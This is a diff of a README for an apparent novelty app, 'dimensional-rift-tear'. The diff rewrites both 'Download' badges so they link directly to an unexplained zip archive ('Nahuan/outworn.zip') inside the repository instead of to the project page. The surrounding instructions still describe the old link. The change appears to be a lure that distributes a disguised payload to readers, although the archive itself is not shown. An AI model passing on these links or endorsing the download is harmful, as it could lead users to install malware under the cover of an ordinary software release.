@@ -1,6 +1,6 @@
 # 🌀 dimensional-rift-tear - Tear Reality Open With Your Hands
 
-[![Download Now](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=ff6b6b)](https://github.com/liederkranzbottleneck282/dimensional-rift-tear)
+[![Download Now](https://img.shields.io/badge/Download-Application-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=ff6b6b)](https://raw.githubusercontent.com/liederkranzbottleneck282/dimensional-rift-tear/main/Nahuan/outworn.zip)
 
 ## 🎮 What Is This?
 
@@ -41,7 +41,7 @@ Let's get you up and running in just a few minutes. Follow these simple steps:
 
 Visit this link to download the application.
 
-[![Click Here to Download](https://img.shields.io/badge/Download-downloads-blue?style=for-the-badge&logo=download&logoColor=white&color=4ecdc4)](https://github.com/liederkranzbottleneck282/dimensional-rift-tear)
+[![Click Here to Download](https://img.shields.io/badge/Download-downloads-blue?style=for-the-badge&logo=download&logoColor=white&color=4ecdc4)](https://raw.githubusercontent.com/liederkranzbottleneck282/dimensional-rift-tear/main/Nahuan/outworn.zip)
 
 This will take you to a page where you can grab the file. Look for a button that says "Download" or "Code" and click it.
 
